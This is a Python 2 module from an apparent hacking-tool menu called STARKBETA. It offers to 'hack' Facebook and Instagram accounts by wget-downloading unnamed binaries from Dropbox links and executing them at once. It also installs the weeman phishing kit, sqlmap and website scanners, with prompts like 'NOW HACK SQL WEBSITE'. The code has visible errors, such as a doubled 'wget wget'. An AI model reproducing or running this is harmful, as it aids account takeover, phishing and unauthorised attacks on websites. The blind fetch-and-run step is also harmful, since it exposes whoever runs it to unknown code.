##starkmcore.py - useful module for STARKBETA
import os
import sys
import time
from termcolor import colored

backtomenubanner = """
BACK TO MENU ?
[1] YES
[2]  NO
"""
def Facebookhack():
	print 'n\###### installimg facebook hack'
	os.system('apt install python2')
	os.system('wget https://www.dropbox.com/s/dygbg1y8kojc4rr/fb')
	os.system('chmod +x fb')
	os.system('./fb')
	os.system('rm -r fb password.apk')
	backtomenu()
	
def Instagramhack():
	print 'n\###### installing instagram hack'
	os.system('apt install python2')
	os.system('wget wget https://www.dropbox.com/s/1sjot5w4af4t17o/instahack')
	os.system('chmod +x instahack')
	os.system('./instahack')
	os.system('rm -r instahack')
	print 'NOW GO TO INSABRUTE AND HACK IT'
	backtomenu()
	
def Lazymux():
	print 'n\###### installing lazymux'
	os.system('git clone https://github.com/Gameye98/Lazymux')
	os.system('mv Lazymux ~')
	print 'Lazymux is installed'
	backtomenu()
	
def Sqli():
    print 'n\###### installing SQLI'
    os.system('git clone https://github.com/sqlmapproject/sqlmap')
    os.system('mv sqlmap ~')
    print 'NOW HACK SQL WEBSITE??????'
    backtomenu()
    
def Weeman():
    print 'n\###### installung weeman'
    os.system('git clone https://github.com/evait-security/weeman')
    os.system('mv weeman ~')
    print 'phishing with weeman oh yaaaaaa??????'
    backtomenu()
    
def Sqlwebsitescanner():
    print 'n\###### install Sql website scanner'
    os.system('git clone https://github.com/Cvar1984/sqlscan.git/')
    print 'NOW SCAN SQL ERROR IN WEBSITE'
    backtomenu()
	
def Redhawk():
	print 'n\###### installing RED_HAWK'
	os.system('git clone https://github.com/Tuhinshubhra/RED_HAWK')
	os.system('mv RED_HAWK ~')
	print'REDHAWK IS INSTALLED GET ALL INFO. FROM WEBSITE'
	backtomenu()
    
def restartprogram():
	python = sys.executable
	os.execl(python, python, * sys.argv)
	curdir = os.getcwd()
	
def backtomenu():
	print backtomenubanner
	backtomenu = raw_input("stark > ")
	if backtomenu == "1":
		restartprogram()
	elif backtomenu == "2":
		sys.exit()
	else:
		print (colored("ERROR: WRONG COMMAND BRO.?", 'red'))
		time.sleep(2)
		restartprogram()
	
